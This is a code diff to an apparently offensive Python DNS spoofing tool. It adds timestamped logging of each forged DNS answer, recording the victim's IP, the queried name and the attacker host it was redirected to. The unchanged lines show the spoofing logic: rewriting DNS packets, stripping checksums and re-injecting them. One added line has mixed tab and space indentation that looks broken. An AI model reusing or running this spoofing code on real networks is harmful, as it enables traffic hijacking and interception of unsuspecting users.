@@ -6,6 +6,7 @@ import re
 import sys
 import socket
 import terminal_banner
+from datetime import datetime
 
 colors = {
 	'HEADER' : "\033[95m",
@@ -20,6 +21,9 @@ colors = {
 	'BOLD' : "\033[1m",
 	'UNDERLINE' : "\033[4m" 
 }
+
+def FileName():
+	return  datetime.strftime(datetime.now(),'%Y-%m-%d-%H-%M-%S')
 
 def banner():
 	print(colors['HEADER'] +"")
@@ -69,8 +73,11 @@ def process_packet(pkt):
 				del scapy_packet[scapy.IP].chksum
 				del scapy_packet[scapy.UDP].chksum
 				del scapy_packet[scapy.UDP].len
+				file = open('data/dns_log_' + FileName() + '.txt' ,'w+')
+	 			file.write("["+scapy_packet[scapy.IP].dst+"]"+ " " +"["+qname+"]" +" to "  +"["+host_ip()+"]")
 				print(colors['GREEN']+"    [#] Spoofed response sent to "+colors['ENDC']+"["+scapy_packet[scapy.IP].dst+"]"+colors['WARNING']+": Redirecting "+colors['ENDC']+"["+qname+"]"+colors['WARNING']+" to "+colors['ENDC']+"["+host_ip()+"]")
 				pkt.set_payload(str(scapy_packet))
+				file.close()
 	pkt.accept()
 
 def main():
